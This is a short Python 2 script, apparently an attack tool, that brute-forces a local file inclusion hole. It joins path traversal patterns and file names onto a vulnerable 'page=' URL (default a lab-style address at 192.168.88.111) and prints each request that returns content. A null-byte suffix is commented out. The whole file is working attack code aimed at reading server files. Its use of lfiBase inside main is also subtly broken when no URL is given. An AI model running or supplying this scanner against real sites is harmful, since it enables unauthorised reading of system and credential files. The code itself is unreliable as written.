import argparse
import requests
import webbrowser
 
lfiBase = 'http://192.168.88.111/lfi/lfi.php?page='
paths = []
files = []

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="lfi url (ex: http://192.168.88.111/lfi/lfi.php?page=)")
    parser.add_argument("-p", "--pathfile", help="file containing all the path traversal patterns to test (1 per line)")
    parser.add_argument("-f", "--inputfile", help="file containing the list of files to include (1 per line)")
    args = parser.parse_args() 

    if (args.pathfile == None or args.inputfile == None):
        parser.print_help()
        return 0

    if args.url != None:
        lfiBase = args.url

    inputPaths = args.pathfile
    inputFiles = args.inputfile

    with open(inputPaths) as f:
        paths = [line.rstrip('\n') for line in f]

    with open(inputFiles) as f:
        files = [line.rstrip('\n') for line in f]

    print "Valid files:"
    for file in files:
        for path in paths:
            url = lfiBase + path + file  # + "%00"
            page = requests.get(url) 
            if page.text:  # and page.status_code == 200:
                print url
                #webbrowser.open(url)

if __name__ == '__main__':
    main()
